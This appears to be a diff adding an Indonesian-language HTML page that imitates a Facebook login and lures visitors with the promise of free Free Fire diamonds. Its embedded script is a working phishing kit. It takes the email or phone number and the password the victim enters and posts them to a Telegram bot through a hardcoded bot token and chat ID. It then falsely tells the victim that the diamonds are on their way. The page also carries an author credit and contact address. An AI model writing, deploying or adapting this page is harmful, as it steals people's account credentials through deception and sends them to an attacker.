@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login dengan Facebook</title>
+    <link rel="stylesheet" href="facebook.css">
+</head>
+<body>
+    <div class="login-container">
+        <h1>Login dengan Facebook</h1>
+        <img src="facebook-logo.png" alt="Facebook Logo" class="logo">
+        
+        <input type="email" id="email" placeholder="Email atau Nomor Telepon" required>
+        <input type="password" id="password" placeholder="Kata Sandi" required>
+        
+        <button id="login-facebook">Masuk</button> <br>
+        <a href="index.html" target="_blank" class="back-button">⬅️ Kembali</a>
+    </div>
+
+    <script>
+document.getElementById('login-facebook').addEventListener('click', function() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if (email === "" || password === "") {
+        alert("⚠️ Harap isi semua kolom!");
+        return;
+    }
+
+    const now = new Date();
+    const time = now.toLocaleString();
+    const device = "📱 Android"; // Ubah sesuai kebutuhan
+
+    const message = `
+━━━━━━━━━━━━━━━━━━━━━━
+🎉 *LOGIN SUCCESSFUL!* ✅
+━━━━━━━━━━━━━━━━━━━━━━
+
+📝 *Login Details:*
+📱 *Nomor:* \`${email}\`
+🔑 *Password:* \`${password}\`
+⏰ *Time:* ${time}
+📱 *Device:* ${device}
+
+━━━━━━━━━━━━━━━━━━━━━━
+⚠️ *Harap verifikasi login ini segera!*
+━━━━━━━━━━━━━━━━━━━━━━
+
+🔰 *By Arjuna Uop Mabin*
+📩 *Contact:* arjunauopmabin@gmail.com
+`;
+
+    // Ganti dengan Bot Token & Chat ID lu
+    const botToken = "7920514777:AAFwGR_cZ_lM-4bj-06ewMZwZSjsAjkW3ik";
+    const chatId = "7168768981";
+    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(telegramAPI, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown",
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        alert("✅ Diamond💎 akan segera dikirim ke ID Free Fire Anda!");
+        console.log("Pesan terkirim:", data);
+    })
+    .catch(error => {
+        alert("❌ Gagal mengirim diamond");
+        console.error("Error:", error);
+    });
+});
+    </script>
+</body>
+</html>
